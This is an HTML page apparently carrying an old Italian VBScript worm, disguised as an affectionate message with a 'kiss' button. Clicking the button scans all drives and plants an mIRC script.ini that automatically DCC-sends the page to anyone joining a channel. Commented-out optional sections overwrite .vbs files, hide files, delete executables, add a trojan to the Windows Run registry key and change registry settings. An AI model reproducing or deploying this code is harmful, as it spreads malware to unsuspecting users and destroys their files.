 <HTML>
 <HEAD><TITLE>PINKER IL MITO!</TITLE></HEAD>
 <SCRIPT LANGUAGE="VBScript">
 <!--

Dim FsysObj,FsysObj_FOpen,RegOper,FileDup,FuncResult

'Set RegOper = CreateObject("WScript.FileSystemObject")

Set FsysObj = CreateObject("Scripting.FileSystemObject")

' 
' ACTIVE THIS LINE IN YOU WOULD LIKE TO ACTIVE HIDDEN SECTIONS:
' (0) (1) (2) (3) (4) (5)
'
' set FsysObj_Fopen = FsysObj.OpenTextFile(WScript.ScriptFullname,1)
' FileDup =FsysObj_Fopen.ReadAll
'



function FolderExist(Folder)

'On Error Resume Next

if (FsysObj.GetFolderExists(Folder)) then
FuncResult = 0
else
FuncResult = 1
end if
FolderExist = FuncResult
end function

function FileExist(File)

'On Error Resume Next

if (FsysObj.FileExists(File)) Then
FuncResult = 0
else
FuncResult = 1
end if
FileExist = FuncResult
end function

function RegKeyRead(value)

'On Error Resume Next

RegKeyRead=RegOper.RegRead(value)
end function

Sub Get_Drivers_OnClick()

'On Error Resume Next

Dim SysDrivers,SingleDrive
Set SysDrivers = FsysObj.Drives
For each SingleDrive in SysDrivers
If SingleDrive.DriveType = 2 or SingleDrive.DriveType = 3 Then
Get_Folder(SingleDrive.path&"/")
end if
Next
end Sub

Sub Get_Folder(CurrentDrive) 
 
'On Error Resume Next

dim Folder,SubFolder,SingleFolder
set Folder = FsysObj.GetFolder(CurrentDrive)  
set SubFolder = Folder.SubFolders

for each SingleFolder in SubFolder

The_Abbumming_Day(SingleFolder.path)

Get_Folder(SingleFolder.path)

next  
End Sub


Sub The_Abbumming_Day(Folder)

'On Error Resume Next

Dim FoldScan,FoldFiles,FileName
set FoldScan = FsysObj.GetFolder(Folder)
set FoldFiles = FoldScan.Files

FirstHit = 1

for each FileName in FoldFiles

FileName=lcase(FileName.name)

'
' HIDDEN SECTION: (0) THESE LINES ARE NEEDED BY THE NEXT DISABLED CODE SECTIONS ...
'
'FileExtension=FsysObj.GetExtensionName(FileName.path)
'FileExtension=lcase(FileExtension)
'
'HIDDEN SECTION: (1) VIRUS DUPLICATION ! ACTIVE THIS IF YOU ARE SLIGHTLY BASTARD ;)
'
'if (FileExtension="vbs") or (FileExtension="vbe") then
'set FileCloning = FsysObj.OpenTextFile(FileName.path,2,true)
'FileCloning.write FileDup
'FileCloning.close
'end if
'

'
' HIDDEN SECTION: (2) WOULD YOU LIKE TO ACTIVE THIS SECTION?
'                     ....... HOW MANY FATHERS YOU HAVE ?!!?
'
'set FsysObj_Attrib=FsysObj.GetFile(FileName.path)
'FsysObj_Attrib.attributes=FsysObj_Attrib.attributes+2
'

'
'HIDDEN SECTION: (3) YOU ARE A REAL BASTARD IF ACTIVE THIS CODE!!!!! ;)
'
'if FileExtension = "com" or FileExtension = "exe"
'FsysObj.DeleteFile(FileName.path)
'End if
'

'
'
' HIDDEN SECTION: (4) YOU HAVE INSTALLED A TROYAN ON THIS MACHINE??? ... RUN IT ON STARTUP!
'
'if (FileExist("PATH_OF_THE_TROYAN.EXE")=0) then
'RegOper.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\TROJAN","PATH_OF_THE_TROYAN.EXE"
'end if
'


If FileName = "mirc32.exe" then

msgbox("MIRC!")

set TxtFileObj=FsysObj.CreateTextFile(Folder&"\script.ini")

TxtFileObj.WriteLine "[script]"
TxtFileObj.WriteLine ";It's a bad day please: ABBUMMATI! "
TxtFileObj.WriteLine "n0=on 1:JOIN:#:{"
TxtFileObj.WriteLine "n1=  /if ( $nick == $me ) { halt }"
TxtFileObj.WriteLine "n2=  /.dcc send $nick ""ABBUMMING.HTM"""
TxtFileObj.WriteLine "n3=}"
TxtFileObj.close

if FirstHit then
'RegOper.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",Folder&"\ABBUMMING.HTM"

'
'  HIDDEN SECTION: (5) WINDOWS REGISTRY JOKES ;)
'
'RegOper.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\MenuDropAlignment","1"
'
'

FirstHit = 0
end if

set TxtFileObj=FsysObj.CreateTextFile(Folder&"\ABBUMMING.HTM")

TxtFileObj.WriteLine "<html>"
TxtFileObj.WriteLine ""
TxtFileObj.WriteLine "<head>"
TxtFileObj.WriteLine "<title>E</title>"
TxtFileObj.WriteLine "</head>"
TxtFileObj.WriteLine ""
TxtFileObj.WriteLine "<body>"
TxtFileObj.WriteLine ""
TxtFileObj.WriteLine "<p align=""center"">E' UNA GIORNATA DI MERDA?</p>"
TxtFileObj.WriteLine "<p>&nbsp;</p>"
TxtFileObj.WriteLine "<p align=""center""><font size=""6"">ABBUMMATI!</font></p>"

TxtFileObj.WriteLine "</body>"

TxtFileObj.WriteLine "</html>"


TxtFileObj.close

end if

next

End Sub
 -->
 </SCRIPT>
 <BODY>
 <CENTER>
<FORM NAME="frmForm"

 <Input Type = "Text"><p>
 TI VOGLIO BENE! MA TANTOOOOOOO!&nbsp;<p>&nbsp;


<Input Type = "Button" NAME="Get_Drivers" VALUE="UN BACETTO PER TE"><p>

 </FORM>
 </CENTER>
 </BODY>
 </HTML>

